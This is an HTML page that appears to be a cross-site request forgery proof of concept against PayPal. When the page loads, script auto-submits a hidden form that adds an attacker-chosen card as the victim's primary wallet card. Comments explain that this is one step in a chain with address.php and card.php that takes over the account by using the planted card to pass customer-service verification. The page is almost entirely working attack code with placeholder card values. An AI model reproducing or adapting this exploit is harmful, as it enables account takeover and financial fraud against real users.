<html>
<head>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>

<script>
$(document).ready(function(){$("#card").submit();});
</script>
	
</head>
<body>
	<form id="card" method="post" action="https://www.paypal.com/myaccount/wallet/cards" />
		<input type="hidden" name="hasExpired" value="false" />
		<input type="hidden" name="isInstorePreferred" value="false" />
		<input type="hidden" name="isPrimary" value="true" />
		<input type="hidden" name="type" value="debit" />
		<input type="hidden" name="creditOrDebit" value="credit" />
		<input type="hidden" name="cardType" value="visa" /> <!--master_card or visa-->
		<input type="hidden" name="ccNum" value="XXXXXXXXXXXXXXXX" /><!-- credit card number -->
		<input type="hidden" name="expirationDate" value="XX/XX" /><!--mm/yy-->
		<input type="hidden" name="expirationMonth" value="XX" /><!--mm-->
		<input type="hidden" name="expirationYear" value="XXXX" /><!--yyyy-->
		<input type="hidden" name="securityCode" value="XXX" /><!--CVV-->
		<input type="hidden" name="billingAddressId" value="XXXXXXXX" />
		<!-- This billingAddressId needs to be captured from JSON data once address.php is executed -->
		<!-- An address needs to be tied to the new credit card otherwise it wont work -->
		<!-- card.php is required to gain access to account as card number is used for verification by cust serv officer -->
		<input type="hidden" name="startMonth" value="" />
		<input type="hidden" name="startYear" value="" />
		<input type="hidden" name="issueNumber" value="" />
		<input type="hidden" name="dobDay" value="" />
		<input type="hidden" name="dobMonth" value="" />
		<input type="hidden" name="dobDobYear" value="" />
	</form>

</body>
</html>
